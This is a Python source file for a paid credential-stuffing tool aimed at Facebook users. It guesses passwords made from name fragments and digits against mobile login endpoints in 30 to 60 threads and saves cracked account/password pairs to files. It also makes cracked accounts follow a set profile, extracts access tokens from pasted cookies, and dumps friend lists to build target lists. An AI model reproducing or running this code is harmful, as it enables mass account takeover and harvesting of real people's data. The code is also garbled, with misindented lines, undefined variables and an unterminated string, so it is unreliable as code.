#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
proxy = requests.get('https://raw.githubusercontent.com/JUTTBRAND/a/main/bbnew.txt').text.splitlines()
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """                  
   ###    ##     ## ########  
  ## ##    ##   ##  ##     ## 
 ##   ##    ## ##   ##     ## 
##     ##    ###    ########  
#########   ## ##   ##     ## 
##     ##  ##   ##  ##     ## 
##     ## ##     ## ########  
=================================================
    [-] AUTHOR    :\033[1;32m AZAN CHAUDRY
    [-] GITHUB    :\033[1;32m MR-AZAN
    [-] WhatsApp  :\033[1;32m +923165456679
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.2
    [-] STATUS    :\033[1;32m PAID
================================================== """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back AXB Menu ")
	    sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Crack File ')
    print(' [2] Dump Create File ')
    print(' [3] Remove Dubal Links')
    print(' [4] Login Tool ')
    print(' [5] Logout Cookie ')
    print(' [w] Join Whatsapp Group ')
    print(' [f] Exit ')
    print('\033[1;97m-----------------------------------------------') 
    _sarfraz___ = input(' [\x1b[1;91m?\x1b[1;97m] Select Menu: ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        create_file()
    
    if _sarfraz___ in ('3', '03'):
        dupcutter()
    if _sarfraz___ in ('4', '04'):
    	pass
    if _sarfraz___ in ('4', '04'):
    	pass
    os.system("xdg-open https://chat.whatsapp.com/+923165456679 ")
class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AXB] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                ses.header.update = ({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
               ses.header1.update = ({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                po = session.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [AXB-SUCCESSFUL] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AXB_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [AXB-CHECKPOINT] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('AXB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [AXB-CHECKPOINT] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('AXB_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(ses,coki):
	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
	get = r.find('a', string='Follow').get('href')
	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;97m[1] \033[1;97m Crack With Only Name All Auto Pass \033[1;92m [V Fast] ')
        print('\033[1;97m[2] \033[1;97m Crack With Name digit Auto Pass \033[1;92m[fast]')
        print('\033[1;97m[3] \033[1;97m Crack With Mix Auto Pass \033[1;92m[Fast]')
        print('\033[1;97m[4] \033[1;97m Crack With Full Name digit Auto Pass \033[1;92m[Fast]')
        print('\033[1;97m[5] \033[1;97m Crack With Full Name digit Auto Pass \033[1;92m[Slow]')
        print('\033[1;97m[6] \033[1;97m Crack With Last Name Digit Auto Pass \033[1;92m[Slow]')
        print('\033[1;97m[7] \033[1;97m Crack With Mix Auto Pass \033[1;92m[V Slow]')
        print('\033[1;97m[8] \033[1;97m Crack With Name @ digit Auto Pass \033[1;92m[Normal]')
        print('\033[1;97m[9] \033[1;97m Crack With Choice Pass Name \033[1;92m[With Auto Pas]')
        print('\033[1;97m[10]  \033[1;97mCrack With Choice Pass Digit \033[1;92m[Your own pas]')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\n [\x1b[1;91m?\x1b[1;97m] select pass: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.title()
                        lasts = last.title()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+' '+lasts, first+"123"]
                        else:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+' '+lasts, first+"123"]
                           
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('4', '04'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('5', '05'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"123", xz[0]+xz[1]+"12345"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"123", xz[0]+xz[1]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('6', '06'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1234", xz[1]+"786"]
                        else:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1234", xz[1]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('7', '07'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=60) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('8', '08'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('9', '09'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.title()
                        lasts = last.title()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+"123", first+"12345", first+"786"]
                        else:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+"123", first+"12345", first+"786"]
                     
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('10', '10'):
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' % len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with sarfrazssb(max_workers=35) as ssbworld:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[1]+xz[0], xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                            pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

def create_file():
    os.system('clear')
def login():
	os.system("clear")
	print(Mr_KAUSAR)
	try:
		fbcokis= input('\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m] ENTER FRESH COOKIS :\x1b[1;91m ')
		head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
		open("/sdcard/data/token.txt", "w").write(eaag.group(1))
		open("/sdcard/data/cookie.txt", "w").write(fbcokis)
		token = open('/sdcard/data/token.txt','r').read()
		info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
		os.system("clear")
		Mr_K4US4R()
	except Exception as e:
		os.system("rm -rf /sdcard/data/token.txt")
		print(f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m] Error {e}")
		slp(2)
		login()
def grep(f):
	o = input('\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m] FILE NAME :\x1b[1;94m ')
	try:
		ask_link = int(input('\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m] DUMP ID LIMIT :\x1b[1;92m '))
	except:
		ask_link = 1
		completed = 0
	for links in range(ask_link):
		li = input('\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]EXAMPLE \033[1;93m[100082,100083,100084\n\x1b[1;97m[\x1b[1;91m★\x1b[1;97m]\x1b[1;91m●\x1b[1;93m●\x1b[1;92m●\x1b[1;97m[\x1b[1;91m★\x1b[1;97m] \x1b[1;92mPUT YOUR UID CODE :\x1b[1;95m ')
		os.system('cat '+f+' | grep "'+li+'" >> '+o)
	print("")
	
	print(f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DUMP SUCCESSFUL")
	print(f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]NEW FILE SAVE\x1b[1;92m " + o)
	input(f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]BACK Menu")
	Mr_K4US4R()
def Mr_K4US4R():
	fbidz = []
	os.system("clear")
	print(Mr_KAUSAR)
	try:
		fbcokis = open("/sdcard/data/cookie.txt", "r").read()
		token = open('/sdcard/data/token.txt','r').read()
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
	except:
		slp(1)
		login()
	global totaldmp,count
	try:
		token=open('/sdcard/data/token.txt','r').read()
		fbcokis = open("/sdcard/data/cookie.txt", "r").read()
	except FileNotFoundError:
		print("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]TOKEN NOT FOUND")
		slp(1)
		cmd('rm -rf /sdcard/data/token.txt')
		login()
	try:
		cmd('clear')
		os.system("clear")
		print(Mr_KAUSAR)
		try:
			fbbuid = input("\x1b[1;97m[\x1b[1;91m●\x1b[1;97m]\x1b[1;91m●\x1b[1;93m●\x1b[1;92m●\x1b[1;97m[\x1b[1;91m●\x1b[1;97m] \x1b[1;92mEXAMPLE\033[1;93m [100084066754739]\n\x1b[1;97m[\x1b[1;91m●\x1b[1;97m]\x1b[1;91m●\x1b[1;93m●\x1b[1;92m●\x1b[1;97m[\x1b[1;91m●\x1b[1;97m] \x1b[1;92mENTER PUBLIC ID :\x1b[1;91m ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				fbidz.append(idnm['id'])
		except KeyError:
			
			print("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]Your Id Is Not Public")
			Mr_K4US4R()
		filepath = input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]ENTER NEW FILE NAME :\x1b[1;93m ")
		print("\x1b[1;92m•──────────────────────────────────────•────•")
		apnd = open(filepath,'w')
		for fbuid in fbidz:
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
				print("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DUMP UID : " + fbuid)
			except KeyError:
				print('\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DUMP UID : ' + fbuid)
		apnd.close()
		ch_x1 = input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DO YOU WANT TO USE ID SEPARATIR [n/y] : ")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			newfile = input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]FILE WITHOUT DUPLICATE ID SAVE : ")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			ch_x2 = input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DO YOU WANT TO USE ID SEPARATIR [n/y] : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(newfile)
			else:
				print (f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]YOUR DUMP FILE SAVE AS :\x1b[1;92m {newfile} \x1b[0;37m")
				print('\n')
				input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]BACK ")
				Mr_K4US4R()
		else:
			print('\n')
			ch_x2 = input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]DO YOU WANT TO USE ID SEPARATIR [n/y] : ")
			if ch_x2 in ["yes","Yes","YES","Y","y"]:
				grep(filepath)
			else:
				print (f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]TOTAL DUMP ID :\x1b[1;92m {totaldmp}")
				print (f"\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]YOUR DUMP FILE :\x1b[1;92m {filepath} ")
				input("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]BACK")
				Mr_K4US4R()
	except Exception as e:
		print("\033[34;1m \033[92;1m[\033[91;1m●\033[92;1m]ERORR : %s"%e)
		exit("")
		
		
		
		
def xd():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    try:
        httpCaht = requests.get('https://github.com/JUTTBRAND/BRAND/blob/main/Approval.txt').text
        if id in httpCaht:
            print("\033[1;92mYour Token is successfully Approved")
            msg = str(os.geteuid())
            time.sleep(0.3)
            xyz()
            pass
        else:
            print("\x1b[37;1mYour Token :\033[1;92m "+id)
            print('\033[1;97m-----------------------------------------------')
            print("\x1b[1;97mThis is Paid tool")
            print("\x1b[1;97m600=30DAYS")
            print("\x1b[1;97m350=15DAYS")
            print("\x1b[1;97m===========================================")
            print("\x1b[1;97mAGR AP BUY KARNA CHAHTY HEN TO INBOX KREN")
            print("\x1b[1;97mAgr Ap Termux delt ya data clear krte hen to admin Zimydaar nahi hoga")
            print("\x1b[1;97mAgr Facebook update py jati he to ok idz na ay to admin zimydaar nahi")
            print("\x1b[1;97m===========================================")
            print("\x1b[1;97mYe upar apki key he ye copy krky inbox kro")
            print("\x1b[1;97mCopy Token and Press Enter")
            os.system('xdg-open https://wa.me/+923231243823')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
    
    
    
sarfraz()
xd()
